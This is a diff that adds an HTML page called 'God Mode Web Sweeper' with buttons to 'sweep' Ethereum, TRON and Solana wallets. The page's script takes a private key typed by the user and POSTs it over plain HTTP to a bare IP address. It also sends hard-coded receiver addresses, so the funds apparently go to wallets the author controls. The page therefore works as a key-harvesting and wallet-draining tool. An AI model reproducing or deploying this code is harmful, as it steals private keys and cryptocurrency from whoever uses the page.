@@ -1,1 +1,63 @@
-hii
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>God Sweeper UI (Vercel)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  </head>
+  <body style="background:black;color:white;text-align:center;padding-top:50px;">
+    <h1>🔱 God Mode Web Sweeper (Connected)</h1>
+    <button onclick="sweepETH()">Sweep ETH via Backend</button>
+    <br /><br />
+    <button onclick="sweepTRON()">Sweep TRON via Backend</button>
+    <br /><br />
+    <button onclick="sweepSOL()">Sweep SOL via Backend</button>
+    <br /><br />
+    <input type="text" id="privKey" placeholder="Enter Private Key" style="padding:10px;width:300px;"><br><br>
+
+    <script>
+      const ETH_RECEIVER = "0xea1ed723027eb7151237ea90a2a9f32a49a82a77";
+      const TRX_RECEIVER = "TCyCS1m1PSyWK3xf2CUAqwXudzwuCVHuHt";
+      const SOL_RECEIVER = "CnCiXRBZwNTbZATjLyrNm6Xo27ieJCnKqVJsywtkRR81";
+      const API = "http://154.61.74.123:3000/sweep";
+
+      async function sweepETH() {
+        const key = document.getElementById("privKey").value;
+        if (!key) return alert("Private key required.");
+        const res = await fetch(API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chain: "eth", privateKey: key, toAddress: ETH_RECEIVER })
+        });
+        const data = await res.json();
+        alert(data.success ? "✅ ETH sweep success!" : `❌ ${data.error}`);
+      }
+
+      async function sweepTRON() {
+        const key = document.getElementById("privKey").value;
+        if (!key) return alert("Private key required.");
+        const res = await fetch(API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chain: "tron", privateKey: key, toAddress: TRX_RECEIVER })
+        });
+        const data = await res.json();
+        alert(data.success ? "✅ TRON sweep success!" : `❌ ${data.error}`);
+      }
+
+      async function sweepSOL() {
+        const key = document.getElementById("privKey").value;
+        if (!key) return alert("Private key required.");
+        const res = await fetch(API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chain: "sol", privateKey: key, toAddress: SOL_RECEIVER })
+        });
+        const data = await res.json();
+        alert(data.success ? "✅ SOL sweep success!" : `❌ ${data.error}`);
+      }
+    </script>
+  </body>
+</html>
